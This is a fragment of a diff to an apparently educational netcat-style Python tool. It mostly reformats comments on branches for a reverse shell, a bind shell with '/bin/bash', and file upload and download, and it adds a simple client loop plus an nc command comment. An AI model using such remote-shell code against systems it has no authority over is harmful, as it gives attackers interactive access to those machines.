@@ -83,7 +83,7 @@ def upload(s,raddr,file_name):
           break
 
 ### Act as a client ###
-## nc -lvnp 6666 < out.txt
+## nc -lvnp 6666 < out.txt, nc 120.0.0.1 6666
 
 def download(ip,port,file_name):
     client = send(ip,port)
@@ -103,32 +103,38 @@ def download(ip,port,file_name):
 
 ################### main ##################################
 
-## reverse shell
-if opt.r and opt.t and opt.p:
+
+if opt.r and opt.t and opt.p:      ## reverse shell
     ip = opt.t
     port = opt.p
     raddr = (ip, port)
     cmd = '/bin/bash'
     shell_cmd(raddr)
-## bind shell
-elif opt.b and opt.t and opt.p:
+elif opt.b and opt.t and opt.p:    ## bind shell
     ip = opt.t
     port = opt.p
     s, raddr = listen(ip, port)
     shell_cmd(s)
-## upload file
-elif opt.u and  opt.t and opt.p:
+elif opt.u and  opt.t and opt.p:   ## upload file
     ip = opt.t
     port = opt.p
     s, raddr = listen(ip, port)
     file_name = opt.u
     upload(s,raddr,file_name)
-## download file
-elif opt.d and opt.t and opt.p:
+elif opt.d and opt.t and opt.p:   ## download file
     ip = opt.t
     port = opt.p
     file_name = opt.d
     download(ip,port,file_name)
+elif opt.t and opt.p:             ## connect with a server
+    ip = opt.t
+    port = opt.p
+    client = send(ip, port)
+    while True:
+        request = 'hi'
+        client.send(request.encode())
+        response = client.recv(1024)
+        print(response.decode())
 
 
 
